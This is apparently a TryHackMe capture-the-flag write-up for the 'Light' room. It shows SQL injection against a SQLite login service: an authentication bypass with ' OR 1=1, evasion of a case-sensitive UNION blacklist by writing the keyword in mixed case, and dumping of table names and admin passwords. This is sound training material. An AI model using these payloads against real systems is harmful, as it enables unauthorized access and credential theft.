---

Name: Light
Difficulty: Easy
URL: https://tryhackme.com/room/lightroom
Description: Welcome to the Light database application!

---


## Enumeration

The room exposes a database application over TCP port `1337`.

I connected using Netcat:

```bash
nc 10.114.131.89 1337
```

The application asks for a username and password:

```text
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

Trying a nonexistent username confirms that the application queries a database:

```text
Please enter your username: administrator
Username not found.
```

---

## SQL Injection

I first tested for SQL injection using a simple quote:

```text
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

The error reveals that the application is likely constructing a SQLite query and appending:

```sql
LIMIT 30
```

A basic authentication bypass worked:

```text
Please enter your username: ' OR 1=1 OR '
```

The application returned:

```text
Password: tF8tj2o94WE4LKC
```

This confirms that the username input is vulnerable to SQL injection.

The underlying query is likely similar to:

```sql
SELECT password FROM usertable
WHERE username = '<input>'
LIMIT 30;
```

---

## Bypassing the Blacklist

The application blocks several SQL keywords and characters:

```text
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

It also blocks the word `UNION`:

```text
Please enter your username: ' UNION SELECT 1
Ahh there is a word in there I don't like :(
```

However, the blacklist is case-sensitive.

Using mixed-case SQL keywords bypasses the filter:

```text
UnIoN
```

This allows us to use `UNION SELECT` for database enumeration.

---

## SQLite Version

I first checked the SQLite version:

```text
Please enter your username: ' UnIoN SeLeCt sqlite_version() ' a
Password: 3.31.1
```

So the database is running:

```text
SQLite 3.31.1
```

---

## Enumerating Tables

SQLite stores database metadata in `sqlite_master`.

I queried it with:

```text
' UnIoN SeLeCt group_concat(name) FROM sqlite_master WHERE type='table
```

The application returned:

```text
Password: usertable,admintable
```

There are two tables:

* `usertable`
* `admintable`

---

## Enumerating Users

I queried the usernames from `admintable`:

```text
' UnIoN SeLeCt group_concat(username) FrOm admintable 'a
```

The result was:

```text
Password: TryHackMeAdmin,flag
```

So the table contains two entries:

```text
TryHackMeAdmin
flag
```

---

## Extracting the Passwords

Finally, I extracted the passwords:

```text
' UnIoN SeLeCt group_concat(password) FrOm admintable 'a
```

The application returned:

```text
Password: mamZtAuMlrsEy5bp6q17,THM{REDACTED}
```

The flag is:

```text
THM{REDACTED}
```
